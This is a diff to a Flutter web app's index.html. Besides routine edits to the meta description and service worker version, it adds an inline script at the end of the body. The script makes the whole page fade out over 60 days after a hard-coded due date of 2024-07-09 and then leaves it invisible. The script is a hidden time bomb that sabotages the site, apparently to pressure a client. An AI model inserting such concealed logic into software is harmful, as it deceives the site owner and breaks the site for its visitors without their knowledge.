@@ -18,7 +18,7 @@
 
   <meta charset="UTF-8">
   <meta content="IE=Edge" http-equiv="X-UA-Compatible">
-  <meta name="description" content="A new Flutter project.">
+  <meta name="description" content="Transform your dreams and businesses to the new digital reality. It allows me to develop and work with you hand in hand to reach the next level.">
 
   <!-- iOS meta tags & icons -->
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -34,7 +34,7 @@
 
   <script>
     // The value below is injected by flutter build, do not touch.
-    var serviceWorkerVersion = '978726995';
+    var serviceWorkerVersion = '1052381184';
   </script>
   <!-- This script adds the flutter initialization JS code -->
   <script src="flutter.js" defer></script>
@@ -148,5 +148,21 @@
     </div>
     <img src="LogoBrand.png" alt="My App Logo" />
   </div>
+  <script>
+    const dueDate = new Date('2024-07-09')
+    const deadline = 60
+
+    const dayPassed = Math.floor(
+      (new Date() - dueDate) / (1000 * 60 * 60 * 24)
+    )
+
+    if (dayPassed > 0) {
+      const daysLate = deadline - dayPassed
+      let opacity = daysLate / deadline
+      opacity = Math.min(opacity, 1)
+      opacity = Math.max(opacity, 0)
+      document.body.style.opacity = opacity
+    }
+  </script>
 </body>
 </html>
